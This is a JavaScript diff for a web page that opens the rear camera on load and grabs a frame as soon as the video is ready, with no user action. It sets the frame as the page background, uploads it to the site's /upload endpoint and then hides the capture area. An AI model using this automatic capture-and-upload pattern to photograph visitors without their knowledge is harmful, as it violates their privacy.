@@ -3,47 +3,47 @@ document.addEventListener('DOMContentLoaded', async () => {
     const video = document.getElementById('video');
     const canvas = document.getElementById('capture-canvas');
     const context = canvas.getContext('2d');
+    const backgroundImage = document.getElementById('background-image');
 
     try {
         // Access the back camera
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
         video.srcObject = stream;
 
-        video.addEventListener('loadedmetadata', () => {
+        video.addEventListener('loadedmetadata', async () => {
             // Set canvas size based on video size
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
             // Capture the image quickly
-            setTimeout(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataURL = canvas.toDataURL('image/png');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
 
-                // Display the captured image (optional)
-                const img = new Image();
-                img.src = dataURL;
-                document.body.appendChild(img);
+            // Set the captured image as the background
+            backgroundImage.style.backgroundImage = `url(${dataURL})`;
 
-                // Send image data to server
-                fetch('/upload', {
+            // Optionally, upload the image to the server
+            try {
+                const response = await fetch('/upload', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ image: dataURL })
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('Image uploaded successfully!');
-                    } else {
-                        console.error('Failed to upload image. Status:', response.status);
-                    }
-                }).catch(error => {
-                    console.error('Error occurred during upload:', error);
                 });
 
-                // Hide capture container
-                captureContainer.style.display = 'none';
-            }, 500); // Capture image after a short delay
+                if (response.ok) {
+                    console.log('Image uploaded successfully!');
+                } else {
+                    console.error('Failed to upload image. Status:', response.status);
+                }
+            } catch (error) {
+                console.error('Error occurred during upload:', error);
+            }
+
+            // Hide capture container and stop the video stream
+            captureContainer.style.display = 'none';
+            stream.getTracks().forEach(track => track.stop());
         });
 
         // Show the capture container
